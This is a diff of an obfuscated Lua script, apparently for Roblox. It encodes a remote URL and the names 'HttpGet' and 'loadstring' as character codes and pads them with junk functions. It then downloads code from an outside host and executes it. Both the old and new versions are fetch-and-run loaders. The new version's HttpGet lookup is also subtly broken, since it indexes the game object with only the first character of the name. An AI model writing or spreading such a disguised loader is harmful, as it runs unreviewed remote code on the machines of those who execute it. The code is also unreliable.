@@ -1,38 +1,51 @@
 (function()
-    local c = string.char
-    local function join(t)
-        local s = ""
-        for i = 1, #t do
-            s = s .. c(t[i])
+    local ch = string.char
+    local function join(tbl)
+        local str = ""
+        for i = 1, #tbl do
+            str = str .. ch(tbl[i])
         end
-        return s
+        return str
     end
 
-    local _ENVIRON = getfenv and getfenv(1) or _ENV
+    local ENV = getfenv and getfenv(1) or _ENV
 
-    local trash = {
-        [math.random(1,9)] = function(...) return ... end,
-        [math.random(10,20)] = "noise",
-        [math.random(21,30)] = function() return not true end
+    local dummy = {
+        [math.random(1,5)] = function(...) return select('#', ...) > 0 and ... or nil end,
+        [math.random(6,10)] = "unused",
+        [math.random(11,15)] = function() return nil end
     }
 
-    local url_bytes = {104,116,116,112,115,58,47,47,99,100,110,46,115,111,117,114,99,101,98,46,105,110,47,98,105,110,115,47,74,116,78,97,98,80,117,86,49,116,47,48}
+    -- URL: https://api.rubis.app/v2/scrap/1UaL4wkDLM9VmzPm/raw
+    local url_bytes = {
+        104,116,116,112,115,58,47,47,97,112,105,46,
+        114,117,98,105,115,46,97,112,112,47,118,50,
+        47,115,99,114,97,112,47,49,85,97,76,52,119,
+        107,68,76,77,57,86,109,122,80,109,47,114,97,119
+    }
+
     local url = join(url_bytes)
 
     local g = game
-    local getHttp = g[c(72)..c(116)..c(116)..c(112)..c(71)..c(101)..c(116)] -- HttpGet
-    local load = _ENVIRON[c(108)..c(111)..c(97)..c(100)..c(115)..c(116)..c(114)..c(105)..c(110)..c(103)] -- loadstring
+    local getHTTP = g[ch(72)]..ch(116)..ch(116)..ch(112)..ch(71)..ch(101)..ch(116) -- "HttpGet"
+    local httpFunc = g[getHTTP]
 
-    local L0 = function(fn)
+    local loader = ENV[
+        ch(108)..ch(111)..ch(97)..ch(100)..
+        ch(115)..ch(116)..ch(114)..ch(105)..
+        ch(110)..ch(103)
+    ] -- "loadstring"
+
+    local function wrapper(f)
         return function(...)
-            return fn(...)
+            return f(...)
         end
     end
 
-    local phase = (((L0)(function(f) return function(g) return f(g) end end)))(function(x) return x end)
+    local phase = wrapper(wrapper(function(f) return f end))
 
     phase(function()
-        local response = getHttp(g, url, true)
-        return load(response)()
+        local data = httpFunc(g, url, true)
+        return loader(data)()
     end)()
 end)()
